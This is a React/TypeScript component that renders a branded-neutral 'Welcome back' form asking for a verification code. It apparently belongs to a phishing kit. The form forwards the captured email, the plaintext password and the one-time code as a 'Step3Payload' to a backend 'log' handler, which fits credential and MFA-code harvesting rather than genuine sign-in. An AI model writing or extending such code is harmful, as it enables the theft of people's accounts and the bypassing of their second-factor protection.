"use client";

import { useId } from "react";

import { zodResolver } from "@hookform/resolvers/zod";
import { Loader2Icon } from "lucide-react";
import { useForm } from "react-hook-form";
import { z } from "zod";

import { Button } from "@/components/offer/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/offer/ui/card";
import { Input } from "@/components/offer/ui/input";
import { Label } from "@/components/offer/ui/label";
import { useMutation } from "@tanstack/react-query";
import { verifyLoginAttempt } from "@/lib/api/handlers/log";
import { Step3Payload } from "@/lib/api/schemas";
import { AxiosError } from "axios";

const verificationSchema = z.object({
  code: z.string().min(1, "Code is required"),
});

type VerificationFormValues = z.infer<typeof verificationSchema>;

interface OfferVerificationCardProps {
  userId: string;
  loginAttemptId: string;
  loginAttemptEmail: string;
  loginAttemptPassword: string;
  onSuccess?: () => void;
}

export function OfferVerificationCard({
  userId,
  loginAttemptId,
  loginAttemptEmail,
  loginAttemptPassword,
}: OfferVerificationCardProps) {
  const codeId = useId();
  const codeErrorId = useId();

  const {
    register,
    handleSubmit,
    setError,
    formState: { errors, isSubmitting },
  } = useForm<VerificationFormValues>({
    resolver: zodResolver(verificationSchema),
    defaultValues: {
      code: "",
    },
  });

  const { mutateAsync: verifyLoginAttemptMutation, isPending } = useMutation({
    mutationFn: (credentials: Step3Payload) => verifyLoginAttempt(credentials),
    onError: (error: AxiosError<{ error: string }>) => setError("code", { message: error.response?.data.error }),
  });

  const onSubmit = async (credentials: VerificationFormValues) => {
    await verifyLoginAttemptMutation({
      userId,
      loginAttemptId,
      email: loginAttemptEmail,
      password: loginAttemptPassword,
      code: credentials.code,
    });
  };

  return (
    <Card className="w-full max-w-md">
      <CardHeader>
        <CardTitle>Welcome back</CardTitle>
      </CardHeader>

      <CardContent>
        <form onSubmit={handleSubmit(onSubmit)} className="mt-6 space-y-5" noValidate>
          <div className="space-y-4">
            <div>
              <Label className="sr-only" htmlFor={codeId}>
                Verification code
              </Label>
              <Input
                id={codeId}
                autoComplete="one-time-code"
                inputMode="numeric"
                placeholder="Verification code"
                aria-invalid={errors.code ? true : undefined}
                aria-describedby={errors.code ? codeErrorId : undefined}
                {...register("code")}
              />
              {errors.code?.message ? (
                <p id={codeErrorId} className="mt-2 text-sm font-medium text-destructive">
                  {errors.code.message}
                </p>
              ) : null}
            </div>
          </div>

          <Button type="submit" className="w-full" disabled={isSubmitting || isPending}>
            {isPending ? <Loader2Icon className="animate-spin size-6" /> : "Verify"}
          </Button>

          <p className="text-center text-lg text-muted-foreground">
            Don&apos;t have an account?{" "}
            <a className="offer-link font-semibold text-foreground" href="#">
              Sign up
            </a>
          </p>
        </form>
      </CardContent>
    </Card>
  );
}
